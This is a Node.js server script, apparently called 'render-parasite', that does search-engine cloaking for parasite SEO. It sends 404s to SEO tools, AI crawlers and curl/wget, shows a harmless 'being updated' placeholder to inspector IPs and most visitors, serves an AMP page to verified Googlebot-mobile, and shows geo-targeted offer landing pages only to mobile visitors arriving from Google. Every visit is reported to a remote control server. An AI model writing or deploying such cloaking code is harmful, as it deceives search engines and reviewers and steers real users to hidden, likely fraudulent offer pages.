const AMP = Buffer.from('', 'base64').toString('utf8');
const TTL_MS = 180000;

const BAD = /ahrefs|semrush|mj12|dotbot|rogerbot|blexbot|megaindex|serpstat|spyfu|majestic|dataforseo|screaming|sitebulb|petalbot|bytespider|gptbot|ccbot|claudebot|anthropic|perplexity|amazonbot|dataprovider|seokicks|linkdex|seznam|barkrowler|zoominfo|semanticbot|python-requests|python-urllib|curl|wget|scrapy|go-http|java\/|okhttp|headless|phantomjs|puppeteer|playwright|httpclient|libwww|nutch|masscan|zgrab/i;
const STUB = '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="robots" content="noindex,nofollow"><title>Welcome</title><style>body{font-family:system-ui,Segoe UI,Arial;background:#f5f6f8;color:#3a3f47;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}.b{text-align:center;padding:24px}h1{font-weight:600;margin:0 0 8px}p{color:#7a828e}</style></head><body><div class="b"><h1>Welcome</h1><p>This site is being updated. Please check back soon.</p></div></body></html>';

let CFG = null, CFG_AT = 0;
const GEO_CACHE = new Map(); // ip -> {geo, at}

function tsig(ms) { try { return AbortSignal.timeout(ms); } catch (_) { return undefined; } }

async function getConfig() {
  const now = Date.now();
  if (CFG && now - CFG_AT < TTL_MS) return CFG;
  try {
    const r = await fetch(`${CORE}/api/cloak/config/${encodeURIComponent(ACCEPTOR)}`,
      { headers: { 'X-Worker-Key': TOKEN }, signal: tsig(2500) });
    if (r.ok) { CFG = await r.json(); CFG_AT = now; return CFG; }
  } catch (_) { /* stale */ }
  return CFG;
}

async function geoOf(ip) {
  if (!ip) return 'XX';
  const c = GEO_CACHE.get(ip);
  if (c && Date.now() - c.at < 3600000) return c.geo;
  let geo = 'XX';
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=countryCode`, { signal: tsig(1500) });
    if (r.ok) { const j = await r.json(); geo = (j.countryCode || 'XX').toUpperCase(); }
  } catch (_) { /* leave XX */ }
  GEO_CACHE.set(ip, { geo, at: Date.now() });
  return geo;
}

function ipToBig(ip) {
  if (ip.includes(':')) {
    const p = ip.split('::');
    const head = p[0] ? p[0].split(':') : [];
    const tail = p[1] !== undefined ? (p[1] ? p[1].split(':') : []) : [];
    const miss = 8 - head.length - tail.length;
    const full = [...head, ...Array(Math.max(0, miss)).fill('0'), ...tail];
    return full.reduce((a, h) => (a << 16n) + BigInt(parseInt(h || '0', 16)), 0n);
  }
  return ip.split('.').reduce((a, o) => (a << 8n) + BigInt(parseInt(o, 10) || 0), 0n);
}
function inCidr(ip, cidr) {
  try {
    const [range, bitsStr] = cidr.split('/');
    const v6 = range.includes(':');
    if (v6 !== ip.includes(':')) return false;
    const total = v6 ? 128n : 32n;
    const bits = BigInt(bitsStr);
    const mask = ((1n << total) - 1n) ^ ((1n << (total - bits)) - 1n);
    return (ipToBig(ip) & mask) === (ipToBig(range) & mask);
  } catch (_) { return false; }
}
function inAny(ip, list) { return Array.isArray(list) && ip && list.some((c) => inCidr(ip, c)); }

function pickGeo(cfg, geo) {
  const lib = (cfg && cfg.geoLandings) || {};
  const bucket = lib[geo] || lib['*'] || [];
  if (Array.isArray(bucket) && bucket.length) return bucket[Math.floor(Date.now() / 1000) % bucket.length];
  return typeof bucket === 'string' ? bucket : null;
}
function beacon(event, geo, kind, referer) {
  return fetch(`${CORE}/api/parasite/hit`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'X-Worker-Key': TOKEN },
    body: JSON.stringify({ host: SELF, event, geo, acceptor: ACCEPTOR, kind: kind || null, referer: (referer || '').slice(0, 500) }),
    signal: tsig(2000),
  }).catch(() => {});
}
function send(res, body, noindex, status) {
  const h = { 'content-type': 'text/html;charset=utf-8', 'cache-control': 'no-store' };
  if (noindex) h['x-robots-tag'] = 'noindex,nofollow';
  res.writeHead(status || 200, h);
  res.end(body || STUB);
}

const server = http.createServer(async (req, res) => {
  try {
    const h = req.headers;
    if ((req.url || '') === '/healthz') { res.writeHead(200); return res.end('ok'); }
    const ua = (h['user-agent'] || '').toLowerCase();
    const ip = ((h['x-forwarded-for'] || '').split(',')[0] || req.socket.remoteAddress || '').trim();
    const referer = h['referer'] || '';
    const lang = (h['accept-language'] || '').slice(0, 2).toLowerCase();

    // 1) SEO/AI-краулеры → 404
    if (BAD.test(ua)) { beacon('block', 'XX', 'scraper', referer); return send(res, 'Not Found', false, 404); }
    // 2) special IP → заглушка
    if (inAny(ip, SPECIAL_V4)) { beacon('stub', 'XX', 'inspector', referer); return send(res, STUB, true); }

    const gMobileUA = /googlebot/.test(ua) && /mobile|android|iphone/.test(ua) && !/inspectiontool|storebot/.test(ua);
    const isBotUA = /googlebot|storebot|inspectiontool|adsbot|bot|crawl|spider/i.test(ua);
    const gIP = inAny(ip, GBOT_V4) || inAny(ip, GBOT_V6);

    // 3) верифиц. Googlebot-mobile → AMP (гео не нужно)
    if (gIP && gMobileUA) { beacon('bot-landing', 'XX', 'gbot-mobile', referer); return send(res, AMP, false); }

    const cfg = await getConfig();
    const chm = h['sec-ch-ua-mobile'];
    const isMobile = chm === '?1' ? true : chm === '?0' ? false : /mobile|android|iphone/i.test(ua);
    const fromSearch = /https?:\/\/(www\.)?google\./.test(referer.toLowerCase())
      || (h['sec-fetch-site'] === 'cross-site' && h['sec-fetch-mode'] === 'navigate');

    // 4) целевой человек из поиска → гео-лендинг офферов (гео резолвим только для не-ботов)
    if (!isBotUA && isMobile && fromSearch && cfg) {
      const geo = await geoOf(ip);
      const targetHuman = (cfg.targetGeos || []).includes(geo)
        && (!(cfg.targetLangs || []).length || (cfg.targetLangs || []).includes(lang));
      if (targetHuman) {
        const g = pickGeo(cfg, geo);
        if (g) { beacon('geo-landing', geo, 'human', referer); return send(res, g, false); }
      }
      beacon('stub', geo, 'human', referer);
      return send(res, STUB, true);
    }

    // 5) прочие → заглушка
    beacon('stub', 'XX', isBotUA ? 'gbot' : 'human', referer);
    return send(res, STUB, true);
  } catch (e) {
    send(res, STUB, true);
  }
});

server.listen(process.env.PORT || 10000, () => console.log('render-parasite up'));
